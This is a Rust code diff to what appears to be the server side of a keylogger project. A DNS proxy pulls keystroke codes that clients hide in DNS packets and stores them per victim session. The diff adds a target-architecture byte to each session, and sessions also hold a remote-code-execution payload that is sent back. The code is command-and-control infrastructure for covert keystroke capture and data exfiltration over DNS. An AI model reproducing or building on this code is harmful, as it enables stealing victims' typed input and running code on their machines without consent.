@@ -7,7 +7,7 @@ use std::{
 use anyhow::Error;
 use chrono::Utc;
 use log::{debug, error, info};
-use tamanoir_common::ContinuationByte;
+use tamanoir_common::{ContinuationByte, TargetArch};
 use tokio::{net::UdpSocket, sync::Mutex};
 
 use crate::{Session, SessionsStore, AR_COUNT_OFFSET, AR_HEADER_LEN, FOOTER_LEN, FOOTER_TXT};
@@ -28,23 +28,26 @@ pub async fn mangle(
         return Err(Error::msg("data to short"));
     }
     let mut current_sessions = sessions.lock().await;
-    let payload_it = data[data.len() - payload_len..].iter();
+    let mut payload_it = data[data.len() - payload_len..].iter();
 
-    //let layout = Layout::from(*payload_it.next().ok_or(Error::msg("data to short"))?); //first byte is layout
+    let arch = TargetArch::try_from(*payload_it.next().ok_or(Error::msg("data to short"))?)
+        .map_err(|e| anyhow::anyhow!("Invalid arch: {}", e))?; //first byte is target arch
     let payload: Vec<u8> = payload_it.copied().collect();
 
     let mut data = data[..(data.len().saturating_sub(payload_len))].to_vec();
     //Add recursion bytes (DNS)
     data[2] = 1;
     data[3] = 32;
-    let session = Session::new(addr).unwrap();
-    if let std::collections::hash_map::Entry::Vacant(e) = current_sessions.entry(session.ip) {
-        info!("Adding new session for client: {} ", session.ip);
-        e.insert(session.clone());
+    let session_obj: Session = Session::new(addr, arch).unwrap();
+    // if let std::collections::hash_map::Entry::Vacant(e) = current_sessions.entry(session.ip) {
+    //     info!("Adding new session for client: {} ", session.ip);
+    //     e.insert(session.clone());
+    // }
+
+    let current_session = current_sessions.get_mut(&session_obj.ip).unwrap();
+    if current_session.arch == TargetArch::Unknown {
+        current_session.arch = session_obj.arch
     }
-
-    let current_session = current_sessions.get_mut(&session.ip).unwrap();
-
     for k in payload {
         current_session.key_codes.push(k)
     }
@@ -142,7 +145,7 @@ impl DnsProxy {
         sessions_store: SessionsStore,
         sock: &UdpSocket,
     ) -> anyhow::Result<()> {
-        let s = Session::new(addr).ok_or(Error::msg(format!(
+        let s = Session::new(addr, TargetArch::Unknown).ok_or(Error::msg(format!(
             "couldn't parse addr for session {}",
             addr
         )))?;
@@ -186,7 +189,7 @@ impl DnsProxy {
             let mut current_sessions = sessions_store.sessions.lock().await;
             let current_session = current_sessions.get_mut(&s.ip).unwrap();
 
-            sessions_store.try_send(current_session.clone())?;
+            //sessions_store.try_send(current_session.clone())?;
 
             let data = match &mut current_session.rce_payload {
                 Some(ref mut rce_payload) => {
